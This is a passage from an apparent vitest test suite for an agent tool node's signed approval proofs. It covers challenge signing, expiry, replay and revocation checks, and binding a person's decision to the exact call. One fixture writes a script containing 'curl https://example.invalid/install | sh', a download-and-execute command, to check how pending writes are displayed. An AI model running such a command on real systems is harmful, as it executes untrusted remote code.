import { existsSync, mkdtempSync, readdirSync, readFileSync, rmSync, writeFileSync } from 'node:fs'
import { createServer, type Server } from 'node:http'
import { join } from 'node:path'
import type { InvokeRequest } from '@5straps/protocol'
import { callDigestOf, shownCallDigestOf, generateSigningKey, publicKeyFrom, readChallenge, signChallenge, signingKeyFromPem, signRequest, SIGNED_REQUEST_MAX_TTL_MS, SIGNED_REQUEST_SKEW_MS, type ApprovalChallenge, type ShownApprovalCall } from '@5straps/protocol/signed-request'
import { afterEach, describe, expect, it, vi } from 'vitest'
import { clientCommand, CLIENT_KEY_FILE } from '../../cli/client.js'
import { keysCommand } from '../../cli/keys.js'
import { approvalsPath, nodeKeyPath } from '../../common/runtime/config.js'
import { flushLogs } from '../../common/runtime/log.js'
import { reviewableArguments } from '../../common/domain/redact.js'
import { createBuckleHttp, type BuckleHttp } from '../support/buckle-http.js'
import { nodeEnvironment } from '../support/node-environment.js'
import { PLAIN_MARKS } from '../../common/domain/permission/decision.js'

// B24, approval-proofs.md: the node signs each waiting ask as a challenge with its own key; a person's
// client verifies it with the node key it pinned, shows the raw action from it, and signs a decision
// over its digest. The decision is consumed once, lives at most 60 s after it was signed, answers only
// that ask, and never lets an approval past a deny the node finds when the call runs.

const ADMIN = 'approval-proofs-admin-token'
const AGENT = 'approval-proofs-agent-token'
const nodes: BuckleHttp[] = []
const servers: Server[] = []
afterEach(async () => {
  vi.restoreAllMocks()
  for (const server of servers.splice(0)) await new Promise(resolve => server.close(resolve))
  for (const node of nodes.splice(0)) await node.close()
})

const owner = generateSigningKey()

type Node = BuckleHttp & { root: string; nodeKey: string }

async function node(): Promise<Node> {
  const { root, environment } = nodeEnvironment('buckle-approval-proofs-', { BUCKLE_AUTH_TOKEN: AGENT, BUCKLE_EXPERIMENTAL_ADMIN_HTTP: 'true', BUCKLE_ADMIN_TOKEN: ADMIN, BUCKLE_PACKS: 'fs', BUCKLE_APPROVAL_TIMEOUT_MS: '1' })
  const started = await createBuckleHttp({ environment })
  nodes.push(started)
  vi.spyOn(process.stdout, 'write').mockImplementation(() => true)
  expect((await keysCommand({ config: started.config, workspaces: await started.services.getWorkspaces(), argv: ['enroll', owner.publicKey, '--purpose', 'approval', '--workspace', started.runtime.workspaceId] })).exitCode).toBe(0)
  vi.mocked(process.stdout.write).mockRestore()
  return Object.assign(started, { root, nodeKey: (await started.services.getNodeSigner()).keyId })
}

function write(root: string, requestId: string, name = 'outside.md'): InvokeRequest {
  return { requestId, tool: 'fs_write', args: { path: join(root, name), content: 'written' }, approvalTokens: [], context: { approvalWait: { mode: 'none' } } }
}

async function ask(buckle: Node, request: InvokeRequest): Promise<string> {
  const asked = await buckle.runtime.invoke({ sessionId: 'chat-1', request })
  if (asked.outcome !== 'approval_required') throw new Error(`expected an ask, got ${asked.outcome}`)
  return asked.approvals[0]!.token
}

/** The call over HTTP under an agent token, in the session `chat-1`. */
async function invokeAs(buckle: Node, token: string, request: InvokeRequest): Promise<{ outcome: string; approvals?: Array<{ token: string }> }> {
  const response = await buckle.request('/v1/invoke', { method: 'POST', headers: { authorization: `Bearer ${token}`, 'content-type': 'application/json' }, body: JSON.stringify({ ...request, context: { ...request.context, sessionId: 'chat-1' } }) })
  return await response.json() as { outcome: string; approvals?: Array<{ token: string }> }
}

/** A second agent token for the workspace, minted through the admin face, with the actor its calls carry. */
async function mintToken(buckle: Node): Promise<{ token: string; actor: string }> {
  const minted = await buckle.request(`/setup/workspaces/${buckle.runtime.workspaceId}/tokens`, { method: 'POST', headers: { authorization: `Bearer ${ADMIN}`, 'content-type': 'application/json' }, body: JSON.stringify({ label: 'second agent' }) })
  expect(minted.status).toBe(201)
  const { token } = await minted.json() as { token: { id: string; token: string } }
  return { token: token.token, actor: `agent:${token.id}` }
}

function signed(buckle: Node, input: { method: string; path: string; body: string; at?: number }): string {
  return signRequest({ key: signingKeyFromPem(owner.privateKeyPem), purpose: 'buckle-approval', node: buckle.config.serverId, nodeKey: buckle.nodeKey, workspace: buckle.runtime.workspaceId, method: input.method, path: input.path, body: input.body, now: input.at ?? Date.now() })
}

async function challenges(buckle: Node, query = ''): Promise<{ node: { keyId: string; publicKey: string }; challenges: Array<{ token: string; signed: string; digest: string; error?: string }> }> {
  const path = buckle.setup(`approvals/challenges${query}`)
  const response = await buckle.request(path, { headers: { authorization: signed(buckle, { method: 'GET', path, body: '' }) } })
  expect(response.status).toBe(200)
  return await response.json() as Awaited<ReturnType<typeof challenges>>
}

function decide(buckle: Node, body: object, at?: number): { send: () => Promise<Response> } {
  const text = JSON.stringify(body)
  const authorization = signed(buckle, { method: 'POST', path: buckle.setup('approvals'), body: text, ...(at ? { at } : {}) })
  return { send: () => buckle.request(buckle.setup('approvals'), { method: 'POST', headers: { authorization, 'content-type': 'application/json' }, body: text }) }
}

describe('an approval decision a person\'s key proves (B24)', () => {
  it.each(['session', 'always'] as const)('allows an enrolled device to create the offered %s grant without reusable admin approval authority', async (scope) => {
    const buckle = await node()
    const asked = await invokeAs(buckle, AGENT, write(buckle.root, `signed-${scope}`))
    const token = asked.approvals![0]!.token
    const [item] = (await challenges(buckle)).challenges
    const unsigned = { token, approved: true, scope }
    expect((await buckle.request(buckle.setup('approvals'), { method: 'POST', headers: { authorization: `Bearer ${ADMIN}`, 'content-type': 'application/json' }, body: JSON.stringify(unsigned) })).status).toBe(409)
    expect(buckle.runtime.grants.list()).toEqual([])
    expect((await decide(buckle, { ...unsigned, challenge: item!.digest }).send()).status).toBe(200)
    // The grant serves the token that asked, in its session; a session one serves no other caller there.
    const served = (actor: string) => buckle.runtime.approvalGate.grants({ sessionId: 'chat-1', actor, consumed: [] }).subjectsFor('write_scope')
    expect(served('agent:node')).toContain(buckle.root)
    expect(served('agent:another')).toEqual(scope === 'session' ? [] : [buckle.root])
  })

  it('clears the next call of the token whose ask a device approved for the session, and asks another token in that session', async () => {
    const buckle = await node()
    const other = await mintToken(buckle)
    const asked = await invokeAs(buckle, AGENT, write(buckle.root, 'session-first', 'first.md'))
    expect(asked.outcome).toBe('approval_required')
    const [item] = (await challenges(buckle)).challenges
    expect((await decide(buckle, { token: asked.approvals![0]!.token, approved: true, scope: 'session', challenge: item!.digest }).send()).status).toBe(200)

    expect((await invokeAs(buckle, AGENT, write(buckle.root, 'session-second', 'second.md'))).outcome).toBe('ok')
    expect((await invokeAs(buckle, other.token, write(buckle.root, 'session-other', 'other.md'))).outcome).toBe('approval_required')
    expect(buckle.runtime.approvalGate.grants({ sessionId: 'chat-1', actor: other.actor, consumed: [] }).subjectsFor('write_scope')).toEqual([])
  })

  it.each([0, 1])('refuses signed once at or after its deadline even while transport skew accepts the proof, late by %sms', async (lateBy) => {
    const buckle = await node()
    const token = await ask(buckle, write(buckle.root, 'strict-proof-expiry'))
    const [item] = (await challenges(buckle)).challenges
    const now = Date.now()
    vi.spyOn(Date, 'now').mockReturnValue(now)
    const response = await decide(buckle, { token, approved: true, scope: 'once', challenge: item!.digest }, now - SIGNED_REQUEST_MAX_TTL_MS - lateBy).send()
    expect(response.status).toBe(409)
    expect(await response.json()).toMatchObject({ error: expect.stringContaining('expired') })
    expect(buckle.runtime.approvals.pending().map(request => request.token)).toContain(token)
    expect(buckle.runtime.approvals.unspent('chat-1')).toEqual([])
  })

  it.each([SIGNED_REQUEST_SKEW_MS, SIGNED_REQUEST_SKEW_MS + 1])('bounds future proof issuance at the configured clock skew, ahead by %sms', async (ahead) => {
    const now = Date.now()
    vi.spyOn(Date, 'now').mockReturnValue(now)
    const buckle = await node()
    const token = await ask(buckle, write(buckle.root, 'future-proof'))
    const [item] = (await challenges(buckle)).challenges
    const response = await decide(buckle, { token, approved: true, scope: 'once', challenge: item!.digest }, now + ahead).send()
    expect(response.status).toBe(ahead === SIGNED_REQUEST_SKEW_MS ? 200 : 401)
    if (ahead === SIGNED_REQUEST_SKEW_MS) {
      const stored = JSON.parse(readFileSync(join(buckle.config.stateDirectory, 'approvals.json'), 'utf8')) as { once: Array<{ expiresAt: string }> }
      expect(Date.parse(stored.once[0]!.expiresAt)).toBe(now + ahead + SIGNED_REQUEST_MAX_TTL_MS)
    } else {
      expect(buckle.runtime.approvals.pending().map(request => request.token)).toContain(token)
      expect(buckle.runtime.approvals.unspent('chat-1')).toEqual([])
    }
  })

  it('does not renew a signed once with an identical later proof or let reusable admin authority repeat it', async () => {
    const buckle = await node()
    const request = write(buckle.root, 'proof-no-renewal')
    const token = await ask(buckle, request)
    const [item] = (await challenges(buckle)).challenges
    let now = Date.now()
    vi.spyOn(Date, 'now').mockImplementation(() => now)
    const issuedAt = now
    const body = { token, approved: true, scope: 'once', challenge: item!.digest }
    expect((await decide(buckle, body).send()).status).toBe(200)
    now += 30_000
    expect((await decide(buckle, body).send()).status).toBe(200)
    const unsigned = await buckle.request(buckle.setup('approvals'), { method: 'POST', headers: { authorization: `Bearer ${ADMIN}`, 'content-type': 'application/json' }, body: JSON.stringify({ token, approved: true, scope: 'once' }) })
    expect(unsigned.status).toBe(409)
    const stored = JSON.parse(readFileSync(join(buckle.config.stateDirectory, 'approvals.json'), 'utf8')) as { once: Array<{ token: string; expiresAt: string }> }
    expect(stored.once).toHaveLength(1)
    expect(Date.parse(stored.once[0]!.expiresAt)).toBe(issuedAt + SIGNED_REQUEST_MAX_TTL_MS)
    now = issuedAt + SIGNED_REQUEST_MAX_TTL_MS
    expect(await buckle.runtime.invoke({ sessionId: 'chat-1', request: { ...request, approvalTokens: [token] } })).toMatchObject({ outcome: 'approval_required' })
    expect(existsSync(join(buckle.root, 'outside.md'))).toBe(false)
  })

  it('signs the workspace\'s name into a challenge only for a device that asks for it, and takes a decision on either digest', async () => {
    const buckle = await node()
    const token = await ask(buckle, write(buckle.root, 'named-challenge'))
    const signer = await buckle.services.getNodeSigner()
    const read = (item: { signed: string }) => readChallenge({ signed: item.signed, nodeKey: publicKeyFrom(signer.publicKey) })!.challenge
    const [plain] = (await challenges(buckle)).challenges
    expect(read(plain!)).not.toHaveProperty('workspaceName')
    for (const query of ['?fields=', '?fields=other', '?other=workspaceName']) expect(read((await challenges(buckle, query)).challenges[0]!)).not.toHaveProperty('workspaceName')
    const [named] = (await challenges(buckle, '?fields=workspaceName')).challenges
    expect(read(named!).workspaceName).toBe(buckle.runtime.workspaceName())
    expect(read(named!)).toEqual({ ...read(plain!), workspaceName: buckle.runtime.workspaceName() })
    expect(named!.digest).not.toBe(plain!.digest)
    // The digest a device signs is of the challenge it was shown: one asked with the name, the other without it.
    expect((await decide(buckle, { token, approved: true, scope: 'once', challenge: named!.digest }).send()).status).toBe(200)
    const other = await ask(buckle, write(buckle.root, 'named-challenge-2', 'second.md'))
    const second = (await challenges(buckle)).challenges.find(item => item.token === other)
    expect((await decide(buckle, { token: other, approved: true, scope: 'once', challenge: second!.digest }).send()).status).toBe(200)
  })

  it('shows each waiting ask as the node signed it, raw, and answers exactly the ask whose challenge it names', async () => {
    const buckle = await node()
    const request = write(buckle.root, 'proof-1')
    const token = await ask(buckle, request)
    const listed = await challenges(buckle)
    const signer = await buckle.services.getNodeSigner()
    expect(listed.node).toEqual({ keyId: signer.keyId, publicKey: signer.publicKey })
    const [item] = listed.challenges
    const verified = readChallenge({ signed: item!.signed, nodeKey: publicKeyFrom(signer.publicKey) })
    expect(verified?.digest).toBe(item!.digest)
    // The call as shown, and its digest, which a person's device recomputes from it (owner decision D9).
    const shown = reviewableArguments(request.args)
    expect(verified?.challenge).toMatchObject({
      node: buckle.config.serverId, workspace: buckle.runtime.workspaceId, token, tool: 'fs_write', rule: 'write_scope', sessionId: 'chat-1', arguments: shown, cwd: buckle.config.cwd, callDigest: callDigestOf({ tool: 'fs_write', arguments: shown }),
      // What the call does, in the node's words, inside the signed bytes (owner decision D9), and what the rules judged it to touch (D17).
      description: `Write 7 bytes to ${JSON.stringify(join(buckle.root, 'outside.md'))} in ${JSON.stringify(buckle.config.cwd)}`, effects: [`write ${join(buckle.root, 'outside.md')}`],
    })
    expect(verified?.challenge).not.toHaveProperty('truncated')
    // A device from before the name existed refuses a challenge with a field it does not know, so none is sent unasked.
    expect(verified?.challenge).not.toHaveProperty('workspaceName')
    // Signed once, the same challenge every time.
    expect((await challenges(buckle)).challenges).toEqual(listed.challenges)

    expect((await decide(buckle, { token, approved: true, scope: 'once', challenge: item!.digest }).send()).status).toBe(200)
    expect(await buckle.runtime.invoke({ sessionId: 'chat-1', request: { ...request, context: {} } })).toMatchObject({ outcome: 'ok' })
    expect(readFileSync(join(buckle.root, 'outside.md'), 'utf8')).toBe('written')

    // Review item 6 of the proof-of-possession fixes: the decision's entry says what the key decided, on
    // which challenge, for which rule and subject; the call that spent it names the key that decided it.
    const entries = buckle.runtime.actions.read(200)
    const decision = entries.find(entry => entry.tool === 'setup_post_approvals' && entry.event === 'result')
    expect(decision).toMatchObject({ actorId: `key:${owner.keyId}`, args: { token, approved: true, scope: 'once', challenge: item!.digest, rule: 'write_scope', subject: buckle.root } })
    const spent = entries.filter(entry => entry.tool === 'fs_write' && entry.event === 'result' && entry.requestId === 'proof-1').at(-1)
    expect(spent).toMatchObject({ outcome: 'ok', decidedBy: [`key:${owner.keyId}`] })
  })

  it('audits a signed denial apart from a signed approval', async () => {
    const buckle = await node()
    const token = await ask(buckle, write(buckle.root, 'proof-deny'))
    const [item] = (await challenges(buckle)).challenges
    expect((await decide(buckle, { token, approved: false, scope: 'once', challenge: item!.digest }).send()).status).toBe(200)
    const decision = buckle.runtime.actions.read(200).find(entry => entry.tool === 'setup_post_approvals' && entry.event === 'result')
    expect(decision).toMatchObject({ actorId: `key:${owner.keyId}`, args: { token, approved: false, scope: 'once', challenge: item!.digest, rule: 'write_scope' } })
  })

  it('refuses a decision on another ask\'s challenge, one naming none, a replay, an expired one, and one signed after its key was revoked', async () => {
    const buckle = await node()
    const first = await ask(buckle, write(buckle.root, 'proof-a', 'a.md'))
    const second = await ask(buckle, write(buckle.root, 'proof-b', 'sub/b.md'))
    const listed = await challenges(buckle)
    const digestOf = (token: string) => listed.challenges.find(item => item.token === token)!.digest
    // Another ask's challenge: the decision answers what the person was shown, or nothing.
    expect((await decide(buckle, { token: first, approved: true, scope: 'once', challenge: digestOf(second) }).send()).status).toBe(409)
    expect((await decide(buckle, { token: first, approved: true, scope: 'once' }).send()).status).toBe(400)
    const expired = decide(buckle, { token: first, approved: true, scope: 'once', challenge: digestOf(first) }, Date.now() - SIGNED_REQUEST_MAX_TTL_MS - SIGNED_REQUEST_SKEW_MS - 1_000)
    expect((await expired.send()).status).toBe(401)
    const denial = decide(buckle, { token: first, approved: false, scope: 'once', challenge: digestOf(first) })
    expect((await denial.send()).status).toBe(200)
    expect((await denial.send()).status).toBe(401)
    vi.spyOn(process.stdout, 'write').mockImplementation(() => true)
    await keysCommand({ config: buckle.config, workspaces: await buckle.services.getWorkspaces(), argv: ['revoke', owner.keyId] })
    expect((await decide(buckle, { token: second, approved: true, scope: 'once', challenge: digestOf(second) }).send()).status).toBe(401)
    expect(buckle.runtime.approvals.pending().map(request => request.token)).toEqual([second])
    expect(buckle.nodeActions.read(200).filter(entry => entry.tool === 'setup_signed_request_refused').map(entry => entry.detail)).toEqual(['expired', 'replayed', 'unknown_key'])
  })

  it('never takes an approval past a deny the node finds when the call runs: a rule the owner adds after the decision still refuses it', async () => {
    const buckle = await node()
    const request = write(buckle.root, 'proof-deny')
    const token = await ask(buckle, request)
    const [item] = (await challenges(buckle)).challenges
    expect((await decide(buckle, { token, approved: true, scope: 'once', challenge: item!.digest }).send()).status).toBe(200)
    const denyFsWrite = JSON.stringify({ version: 1, tools: { deny: ['fs_write'] } })
    expect((await buckle.request(buckle.setup('policy'), { method: 'PUT', headers: { authorization: `Bearer ${ADMIN}`, 'content-type': 'application/json' }, body: denyFsWrite })).status).toBe(200)
    expect(await buckle.runtime.invoke({ sessionId: 'chat-1', request: { ...request, context: {} } })).toMatchObject({ outcome: 'error', error: { code: 'PERMISSION_DENIED' } })
  })

  it('reaches Rings\' relay with nothing secret: public keys, signatures and digests only', async () => {
    const buckle = await node()
    const token = await ask(buckle, write(buckle.root, 'proof-relay'))
    const listed = await challenges(buckle)
    const decision = decide(buckle, { token, approved: false, scope: 'once', challenge: listed.challenges[0]!.digest })
    const relayed = JSON.stringify(listed)
    const nodePem = readFileSync(nodeKeyPath(buckle.config), 'utf8')
    for (const secret of [owner.privateKeyPem, nodePem]) {
      for (const line of secret.split('\n').filter(part => part && !part.startsWith('-----'))) expect(relayed).not.toContain(line)
    }
    expect(Object.keys(listed.node).sort()).toEqual(['keyId', 'publicKey'])
    expect((await decision.send()).status).toBe(200)
  })

  it('is what `buckle client approve` sends, after it verified the challenge with the pinned node key and showed the raw action', async () => {
    const buckle = await node()
    const url = await buckle.listen()
    const environment = { BUCKLE_CLIENT_DIR: join(mkdtempSync(join(buckle.root, 'client-')), 'device') }
    const output = { stdout: '', stderr: '' }
    vi.spyOn(process.stdout, 'write').mockImplementation((chunk) => { output.stdout += String(chunk); return true })
    vi.spyOn(process.stderr, 'write').mockImplementation((chunk) => { output.stderr += String(chunk); return true })
    expect((await clientCommand(['keygen'], environment)).exitCode).toBe(0)
    writeFileSync(join(environment.BUCKLE_CLIENT_DIR, CLIENT_KEY_FILE), owner.privateKeyPem, { mode: 0o600 })
    const token = await ask(buckle, write(buckle.root, 'proof-client'))

    // Not pinned yet: nothing is shown or signed.
    expect((await clientCommand(['approve', url, '--workspace', 'workspace', token], environment)).exitCode).toBe(1)
    expect(output.stderr).toContain('is not pinned on this device')
    // Pinned to the wrong key: the request names that key, so the node refuses it and nothing is shown.
    expect((await clientCommand(['trust', url, buckle.config.serverId, generateSigningKey().publicKey], environment)).exitCode).toBe(0)
    expect((await clientCommand(['approve', url, '--workspace', 'workspace', token], environment)).exitCode).toBe(1)
    expect(output.stderr).toContain('The node answered HTTP 401')

    output.stdout = ''
    await keysCommand({ config: buckle.config, workspaces: await buckle.services.getWorkspaces(), argv: ['node'] })
    const nodeKey = /Public key: +(ed25519:\S+)/.exec(output.stdout)![1]!
    expect((await clientCommand(['trust', url, buckle.config.serverId, nodeKey], environment)).exitCode).toBe(0)
    output.stdout = ''
    expect((await clientCommand(['approvals', url, '--workspace', 'workspace'], environment)).exitCode).toBe(0)
    expect(output.stdout).toContain(`${token}  fs_write asks write_scope`)
    // Fix brief 4, finding 13: the device names the workspace as the person does, beside the id the decision binds.
    expect(output.stdout).toContain(`  workspace: ${buckle.runtime.workspaceName()} (${buckle.runtime.workspaceId})\n`)
    output.stdout = ''
    expect((await clientCommand(['approve', url, '--workspace', 'workspace', token, '--deny'], environment)).exitCode).toBe(0)
    // The node it decides for, before anything is signed.
    expect(output.stdout).toContain(`Node:  ${buckle.config.serverId}  ${buckle.nodeKey}  at ${new URL(url).origin}`)
    expect(buckle.runtime.approvals.pending()).toEqual([])
  })

  it('shows two writes in one directory apart: the path and the content, as the node signed them', async () => {
    const buckle = await node()
    const url = await buckle.listen()
    const environment = await pinnedDevice(buckle, url)
    const notes = await ask(buckle, { ...write(buckle.root, 'shown-notes', 'notes.md'), args: { path: join(buckle.root, 'notes.md'), content: 'hello' } })
    const script = await ask(buckle, { ...write(buckle.root, 'shown-script', 'run.sh'), args: { path: join(buckle.root, 'run.sh'), content: 'curl https://example.invalid/install | sh' } })
    const output = capture()
    expect((await clientCommand(['approvals', url, '--workspace', 'workspace'], environment)).exitCode).toBe(0)
    const shown = output.stdout.split(/\n(?=\S)/)
    const of = (token: string) => shown.find(block => block.startsWith(token))!
    expect(of(notes)).toContain(`"path": "${join(buckle.root, 'notes.md')}"`)
    expect(of(notes)).toContain('"content": "hello"')
    expect(of(script)).toContain('"content": "curl https://example.invalid/install | sh"')
    expect(of(notes)).toContain(`in:       ${buckle.config.cwd}`)
    expect(of(notes).replace(notes, '')).not.toBe(of(script).replace(script, ''))
  })
})

// Review M3 of the second proof-of-possession re-review: one description over what a challenge holds failed the
// whole signed listing (HTTP 500), so no device could approve or deny any ask in the workspace.
describe('a challenge listing with an ask too long to describe whole', () => {
  const longPaths = (root: string) => Array.from({ length: 5 }, (_, index) => join(root, ...Array.from({ length: 4 }, () => 'd'.repeat(200)), `file-${index}.md`))

  it('signs a batch of five long outside paths whole, its summary cut in its own words, and every other ask stays decidable', async () => {
    const buckle = await node()
    const paths = longPaths(buckle.root)
    const batch = await ask(buckle, { requestId: 'long-batch', tool: 'fs_read_batch', args: { paths }, approvalTokens: [], context: { approvalWait: { mode: 'none' } } })
    const other = await ask(buckle, write(buckle.root, 'other-ask'))
    const listed = await challenges(buckle)
    const nodeKey = publicKeyFrom((await buckle.services.getNodeSigner()).publicKey)
    const item = (token: string) => listed.challenges.find(entry => entry.token === token)!
    const verified = readChallenge({ signed: item(batch).signed, nodeKey })!
    expect(verified.challenge).toMatchObject({ tool: 'fs_read_batch', arguments: { paths }, description: expect.stringMatching(/^Read 5 files: ".*" \[summary cut: 3880 of \d+ characters shown; the arguments below are complete\]$/) })
    expect(verified.challenge).not.toHaveProperty('truncated')
    expect(verified.challenge.description!.length).toBeLessThanOrEqual(4_000)
    expect((await decide(buckle, { token: other, approved: true, scope: 'once', challenge: item(other).digest }).send()).status).toBe(200)
  })

  it('lists an ask recorded before this build, and one the node cannot sign, as errors for their tokens, and signs, shows and decides the others', async () => {
    const buckle = await node()
    const other = await ask(buckle, write(buckle.root, 'other-ask'))
    // An ask recorded before this build: its arguments may have been cut, so no device decides it (owner decision D17).
    const recordedBefore = await buckle.runtime.approvalService.request({
      sessionId: 'chat-1', requestId: 'legacy-ask', tool: 'fs_read', wait: { mode: 'none' },
      asks: [{ kind: 'ask', ...PLAIN_MARKS, rule: 'read_scope', subject: join(buckle.root, 'legacy'), reason: 'Reading outside the sandbox', offeredScopes: ['once'] }],
      call: { arguments: { path: join(buckle.root, 'legacy', 'a.md') }, truncated: false, cwd: buckle.config.cwd, description: 'Read a.md' },
    })
    // A whole call whose description is longer than a challenge holds, which only a damaged queue can carry.
    const damaged = await buckle.runtime.approvalService.request({
      sessionId: 'chat-1', requestId: 'damaged-ask', tool: 'fs_read', wait: { mode: 'none' },
      asks: [{ kind: 'ask', ...PLAIN_MARKS, rule: 'read_scope', subject: join(buckle.root, 'damaged'), reason: 'Reading outside the sandbox', offeredScopes: ['once'] }],
      call: { arguments: { path: join(buckle.root, 'damaged', 'a.md') }, cwd: buckle.config.cwd, description: 'x'.repeat(5_000), effects: [], complete: true },
    })
    const legacy = recordedBefore.approvals[0]!.token
    const unsignable = damaged.approvals[0]!.token
    const listed = await challenges(buckle)
    expect(listed.challenges.find(entry => entry.token === legacy)).toEqual({ token: legacy, error: 'recorded before this build: decide at the node or re-send' })
    expect(listed.challenges.find(entry => entry.token === unsignable)).toEqual({ token: unsignable, error: expect.stringContaining('could not sign') })
    expect(listed.challenges.find(entry => entry.token === other)?.signed).toEqual(expect.any(String))

    // A person's device lists all three, refuses to sign the two the node did not, and decides the other.
    const url = await buckle.listen()
    const environment = await pinnedDevice(buckle, url)
    const output = capture()
    expect((await clientCommand(['approvals', url, '--workspace', 'workspace'], environment)).exitCode).toBe(0)
    // In the client's own words, never the listing's (review L5).
    expect(output.stdout).toContain(`${legacy}  not signed by the node: recorded before the node's current build, or its kept call is missing or damaged, so the node holds no whole call for it`)
    expect(output.stdout).toContain(`${unsignable}  not signed by the node: the node could not sign its challenge`)
    expect(output.stdout).not.toContain('decide at the node or re-send')
    expect(output.stdout).toContain(`${other}  fs_write asks write_scope`)
    for (const token of [legacy, unsignable]) {
      output.stderr = ''
      expect((await clientCommand(['approve', url, '--workspace', 'workspace', token], environment)).exitCode).toBe(1)
      expect(output.stderr).toContain('nothing was signed')
    }
    expect((await clientCommand(['approve', url, '--workspace', 'workspace', other], environment, { confirm: async () => true })).exitCode).toBe(0)
    expect(buckle.runtime.approvals.pending().map(request => request.token).sort()).toEqual([legacy, unsignable].sort())
  })

  // Slice 7 review R7-RR-4: an ask this build recorded whole whose call file is then lost is listed with the same
  // fixed reason, which older clients key on; this client's words now name that case too.
  it('lists an ask whose kept call file is missing with the same reason, in words that name the missing call', async () => {
    const buckle = await node()
    const token = await ask(buckle, { ...write(buckle.root, 'lost-call'), context: { approvalWait: { mode: 'none' } } })
    const calls = join(buckle.config.stateDirectory, 'approval-calls')
    for (const name of readdirSync(calls)) rmSync(join(calls, name))
    expect((await challenges(buckle)).challenges).toEqual([{ token, error: 'recorded before this build: decide at the node or re-send' }])
    const url = await buckle.listen()
    const environment = await pinnedDevice(buckle, url)
    const output = capture()
    expect((await clientCommand(['approvals', url, '--workspace', 'workspace'], environment)).exitCode).toBe(0)
    expect(output.stdout).toContain(`${token}  not signed by the node: recorded before the node's current build, or its kept call is missing or damaged`)
    expect(output.stdout).not.toContain('decide at the node or re-send')
  })

  it('records the whole call when a re-send joins an ask recorded before this build, so a device can then decide it', async () => {
    const buckle = await node()
    const request = { ...write(buckle.root, 'legacy-join'), context: { approvalWait: { mode: 'none' as const } } }
    const token = await ask(buckle, request)
    // Rewrite the queue as a build before D17 left it: the call cut and flagged, no effects, no mark.
    const file = join(buckle.config.stateDirectory, 'approvals.json')
    const state = JSON.parse(readFileSync(file, 'utf8')) as { pending: Array<{ call?: Record<string, unknown>; callFile?: unknown }> }
    // Such a build kept the call inline, in approvals.json, with no call file beside it.
    state.pending[0]!.call = { arguments: { content: 'writ... [7 characters, sha256 00]', path: join(buckle.root, 'outside.md') }, truncated: true, cwd: buckle.config.cwd, description: null }
    delete state.pending[0]!.callFile
    writeFileSync(file, JSON.stringify(state))
    expect((await challenges(buckle)).challenges).toEqual([{ token, error: 'recorded before this build: decide at the node or re-send' }])
    expect((await buckle.runtime.invoke({ sessionId: 'chat-1', request })).outcome).toBe('approval_required')
    const [item] = (await challenges(buckle)).challenges
    const verified = readChallenge({ signed: item!.signed, nodeKey: publicKeyFrom((await buckle.services.getNodeSigner()).publicKey) })!
    expect(verified.challenge).toMatchObject({ token, arguments: { content: 'written', path: join(buckle.root, 'outside.md') } })
  })
})

describe('a decision binds the call that runs (review H3 of B23-B25; approval-proofs.md: changed arguments)', () => {
  function invoke(buckle: Node, request: InvokeRequest): Promise<Response> {
    return buckle.request('/v1/invoke', { method: 'POST', headers: { authorization: `Bearer ${AGENT}`, 'content-type': 'application/json' }, body: JSON.stringify(request) })
  }

  it('S1: refuses a re-send under the waiting ask\'s requestId with other arguments, and runs only the call the person saw', async () => {
    const buckle = await node()
    const target = join(buckle.root, 'notes.md')
    const benign: InvokeRequest = { requestId: 'S1', tool: 'fs_write', args: { path: target, content: 'benign' }, approvalTokens: [], context: { sessionId: 'chat-1', approvalWait: { mode: 'none' } } }
    const asked = await invoke(buckle, benign)
    expect(asked.status).toBe(200)
    const token = (await asked.json() as { approvals: Array<{ token: string }> }).approvals[0]!.token
    const changed = { ...benign, args: { path: target, content: 'CHANGED-CONTENT' } }
    const refused = await invoke(buckle, changed)
    expect(refused.status).toBe(409)
    expect(await refused.json()).toMatchObject({ outcome: 'error', error: { code: 'REQUEST_ID_REUSED' } })
    // The ask still names the benign call.
    const [item] = (await challenges(buckle)).challenges
    const verified = readChallenge({ signed: item!.signed, nodeKey: publicKeyFrom((await buckle.services.getNodeSigner()).publicKey) })!
    expect(verified.challenge.arguments).toEqual({ content: 'benign', path: target })
    expect((await decide(buckle, { token, approved: true, scope: 'once', challenge: item!.digest }).send()).status).toBe(200)
    // The changed call, even with the benign call's token, cannot spend what the person approved.
    const withToken = await invoke(buckle, { ...changed, approvalTokens: [token] })
    expect((await withToken.json() as { outcome: string }).outcome).toBe('approval_required')
    expect(existsSync(target)).toBe(false)
    const ran = await invoke(buckle, { ...benign, approvalTokens: [token], context: { sessionId: 'chat-1' } })
    expect(await ran.json()).toMatchObject({ outcome: 'ok' })
    expect(readFileSync(target, 'utf8')).toBe('benign')
  })

  it('S2: a once a person approved on a call\'s challenge is never spent by another call without a token', async () => {
    const buckle = await node()
    const target = join(buckle.root, 'notes.md')
    const approved: InvokeRequest = { requestId: 'S2-approved', tool: 'fs_write', args: { path: target, content: 'approved' }, approvalTokens: [], context: { approvalWait: { mode: 'none' } } }
    const token = await ask(buckle, approved)
    const [item] = (await challenges(buckle)).challenges
    expect((await decide(buckle, { token, approved: true, scope: 'once', challenge: item!.digest }).send()).status).toBe(200)
    const other = await buckle.runtime.invoke({ sessionId: 'chat-1', request: { requestId: 'S2-other', tool: 'fs_write', args: { path: target, content: 'other content' }, approvalTokens: [], context: { approvalWait: { mode: 'none' } } } })
    expect(other.outcome).toBe('approval_required')
    expect(existsSync(target)).toBe(false)
    // The call it was asked for still runs on it, without its token too.
    expect(await buckle.runtime.invoke({ sessionId: 'chat-1', request: { ...approved, requestId: 'S2-approved-again', context: {} } })).toMatchObject({ outcome: 'ok' })
    expect(readFileSync(target, 'utf8')).toBe('approved')
  })
})

describe('a device that recomputes the call digest (owner decision D9)', () => {
  it('refuses to sign a validly signed challenge whose arguments do not match its call digest', async () => {
    const original = { path: '/workspace/notes.md', content: 'hello' }
    const challenge = fakeChallenge({
      // Shown: harmless text. Digested: the call the node was really asked about.
      arguments: { path: '/workspace/notes.md', content: 'harmless' }, callDigest: callDigestOf({ tool: 'fs_write', arguments: original }),
    })
    const device = await fakeNodeDevice(challenge)
    expect((await clientCommand(['approvals', device.url, '--workspace', 'workspace'], device.environment)).exitCode).toBe(0)
    expect(device.output.stdout).toContain('WARNING: the arguments shown do not match the call digest')
    expect((await clientCommand(['approve', device.url, '--workspace', 'workspace', challenge.token], device.environment)).exitCode).toBe(1)
    expect(device.output.stderr).toContain('do not recompute to its call digest; nothing was signed')
    expect(device.decisions).toEqual([])
  })

  // Review item 2 of the proof-of-possession fixes: the agent chooses the subject, the session id and the
